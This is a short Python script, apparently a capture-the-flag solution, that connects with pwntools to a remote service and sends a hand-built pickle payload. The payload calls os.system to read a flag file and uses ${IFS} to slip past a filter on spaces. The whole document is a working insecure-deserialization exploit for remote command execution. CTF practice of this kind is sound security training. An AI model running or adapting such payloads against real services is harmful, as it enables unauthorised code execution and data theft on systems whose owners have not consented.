import pwn

command = b"cat${IFS}../flag.eEdyUbJSVb2TmzALwXHS.txt"
d = b"U\x02osU\x06systemq\xc5\x8a\x0000h\xc5\x93(U" + len(command).to_bytes(1, "big") + command + b"tR."

p = pwn.remote("mc.ax", 31773)
p.sendline(d)
p.interactive()
